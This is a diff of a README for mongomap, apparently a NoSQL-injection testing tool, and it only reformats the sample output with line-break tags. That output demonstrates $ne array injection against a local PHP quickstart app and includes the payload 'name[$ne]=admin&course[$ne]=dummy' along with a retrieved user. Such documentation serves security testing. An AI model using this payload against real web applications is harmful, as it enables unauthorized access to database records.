@@ -17,25 +17,25 @@ python3 mongomap.py -u http://localhost/php-quickstart/quickstart.php --method p
 
 expected output is, that the first user is found and both parameters are classified as being injectable
 
->[*] Test phase completed.
->
->[+] Vulnerable Parameters:
->[+] name
->[+] - Not-Equals Array (param[$ne]) Injection
->[+] course
->[+] - Not-Equals Array (param[$ne]) Injection
->
->[i] Attempting to dump data...
->[*] Parameter: name
->
->[*] Attemping dump with Not-Equals Array (param[$ne]) Injection on param name
->
->
->[+] Not-Equals Array (param[$ne]) Injection for name has retrieved:
->[+]
->[+]     For payload: name[$ne]=admin&course[$ne]=dummy
->[+]
->[+]     Content Difference:
->[+]     Welome, John Doe!
+>[*] Test phase completed.<br>
+><br>
+>[+] Vulnerable Parameters:<br>
+>[+] name<br>
+>[+] - Not-Equals Array (param[$ne]) Injection<br>
+>[+] course<br>
+>[+] - Not-Equals Array (param[$ne]) Injection<br>
+><br>
+>[i] Attempting to dump data...<br>
+>[*] Parameter: name<br>
+><br>
+>[*] Attemping dump with Not-Equals Array (param[$ne]) Injection on param name<br>
+><br>
+><br>
+>[+] Not-Equals Array (param[$ne]) Injection for name has retrieved:<br>
+>[+]<br>
+>[+]     For payload: name[$ne]=admin&course[$ne]=dummy<br>
+>[+]<br>
+>[+]     Content Difference:<br>
+>[+]     Welcome, John Doe!<br>
 >[+]
  
